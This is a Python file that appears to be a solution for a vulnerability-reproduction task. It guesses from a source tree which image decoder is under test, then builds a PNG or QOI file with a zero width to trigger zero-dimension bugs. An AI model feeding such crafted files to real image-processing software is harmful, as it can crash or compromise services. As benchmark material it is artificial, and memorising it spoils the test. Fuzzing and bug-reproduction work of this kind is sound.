import os
import tarfile
import tempfile
import binascii
import zlib


def _read_text_safe(path, limit=1048576):
    try:
        with open(path, 'rb') as f:
            data = f.read(limit)
        return data.decode('utf-8', errors='ignore')
    except Exception:
        return ''


def _detect_format_from_src(src_path):
    # Default to PNG
    scores = {
        'png': 0,
        'qoi': 0,
        'gif': 0,
        'bmp': 0,
        'jpeg': 0,
        'webp': 0,
        'tiff': 0,
        'exr': 0,
    }

    def score_path(p):
        lp = p.lower()
        if 'spng' in lp or 'lodepng' in lp or 'libpng' in lp or 'png' in lp:
            scores['png'] += 5
        if 'qoi' in lp:
            scores['qoi'] += 5
        if 'giflib' in lp or 'gif' in lp:
            scores['gif'] += 3
        if 'bmp' in lp:
            scores['bmp'] += 2
        if 'jpeg' in lp or 'jpg' in lp:
            scores['jpeg'] += 2
        if 'webp' in lp:
            scores['webp'] += 2
        if 'tiff' in lp or 'tif' in lp:
            scores['tiff'] += 2
        if 'openexr' in lp or 'exr' in lp:
            scores['exr'] += 2

    def score_text(txt):
        lt = txt.lower()
        if 'spng' in lt or 'lodepng' in lt or '#include <png' in lt or 'png_' in lt:
            scores['png'] += 3
        if 'qoi' in lt or 'qoif' in lt or 'qoi_' in lt:
            scores['qoi'] += 3
        if 'giflib' in lt or '#include <gif' in lt or 'gif_' in lt:
            scores['gif'] += 2

    # Try to extract and scan
    tmpdir = None
    try:
        if tarfile.is_tarfile(src_path):
            tmpdir = tempfile.mkdtemp(prefix='src-')
            with tarfile.open(src_path, 'r:*') as tf:
                def is_within_directory(directory, target):
                    
                    abs_directory = os.path.abspath(directory)
                    abs_target = os.path.abspath(target)
                
                    prefix = os.path.commonprefix([abs_directory, abs_target])
                    
                    return prefix == abs_directory
                
                def safe_extract(tar, path=".", members=None, *, numeric_owner=False):
                
                    for member in tar.getmembers():
                        member_path = os.path.join(path, member.name)
                        if not is_within_directory(path, member_path):
                            raise Exception("Attempted Path Traversal in Tar File")
                
                    tar.extractall(path, members, numeric_owner=numeric_owner) 
                
                safe_extract(tf, tmpdir)
            root = tmpdir
        else:
            # If it's a directory, scan directly
            root = src_path if os.path.isdir(src_path) else None

        if root and os.path.isdir(root):
            for dirpath, dirnames, filenames in os.walk(root):
                for fn in filenames:
                    full = os.path.join(dirpath, fn)
                    score_path(full)
                    # Only scan likely source/text files
                    ext = os.path.splitext(fn)[1].lower()
                    if ext in ('.c', '.cc', '.cpp', '.h', '.hpp', '.txt', '.md', '.cmake', '.build', '.rs', '.py', ''):
                        txt = _read_text_safe(full, limit=262144)
                        if txt:
                            score_text(txt)
    except Exception:
        pass
    finally:
        if tmpdir and os.path.isdir(tmpdir):
            try:
                # Cleanup temp directory
                for dirpath, dirnames, filenames in os.walk(tmpdir, topdown=False):
                    for f in filenames:
                        try:
                            os.remove(os.path.join(dirpath, f))
                        except Exception:
                            pass
                    for d in dirnames:
                        try:
                            os.rmdir(os.path.join(dirpath, d))
                        except Exception:
                            pass
                try:
                    os.rmdir(tmpdir)
                except Exception:
                    pass
            except Exception:
                pass

    # Prefer PNG if detected, otherwise fall back to PNG as default
    best_fmt = max(scores.items(), key=lambda kv: kv[1])[0]
    if scores[best_fmt] == 0:
        return 'png'
    return best_fmt


def _png_crc(data):
    return binascii.crc32(data) & 0xffffffff


def _png_chunk(typ, data):
    if isinstance(typ, str):
        typ = typ.encode('ascii')
    length = len(data).to_bytes(4, 'big')
    crc = _png_crc(typ + data).to_bytes(4, 'big')
    return length + typ + data + crc


def _make_png_zero_dimension(width_zero=True):
    # width=0, height=1 (or vice versa)
    width = 0 if width_zero else 1
    height = 1 if width_zero else 0

    # PNG signature
    out = bytearray(b'\x89PNG\r\n\x1a\n')

    # IHDR
    bit_depth = 8
    color_type = 6  # RGBA
    ihdr = (
        width.to_bytes(4, 'big') +
        height.to_bytes(4, 'big') +
        bytes([bit_depth, color_type, 0, 0, 0])
    )
    out += _png_chunk('IHDR', ihdr)

    # IDAT: each row must have a filter byte; with width=0, each row is just 1 filter byte
    # If height is 0, there are 0 rows; to trigger processing, we prefer height=1 and width=0.
    rows = height
    if rows < 0:
        rows = 0
    # Ensure at least one row filter byte for width_zero case
    payload = b'\x00' * max(rows, 1)
    comp = zlib.compress(payload)
    out += _png_chunk('IDAT', comp)

    # IEND
    out += _png_chunk('IEND', b'')
    return bytes(out)


def _make_qoi_zero_dimension():
    # QOI header
    # magic 'qoif'
    # width 0, height 1 to hit zero dimension
    magic = b'qoif'
    width = (0).to_bytes(4, 'big')
    height = (1).to_bytes(4, 'big')
    channels = bytes([4])
    colorspace = bytes([0])
    header = magic + width + height + channels + colorspace
    # End marker: 0,0,0,0,0,0,0,1
    end = b'\x00' * 7 + b'\x01'
    return header + end


class Solution:
    def solve(self, src_path: str) -> bytes:
        fmt = _detect_format_from_src(src_path)
        # Prefer PNG; only use QOI if it's strongly indicated
        if fmt == 'qoi':
            # Still, PNG is generally safer to trigger zero dimension bugs;
            # but honor detection for QOI projects.
            try:
                return _make_qoi_zero_dimension()
            except Exception:
                return _make_png_zero_dimension(True)
        # Default and PNG-detected case
        return _make_png_zero_dimension(True)
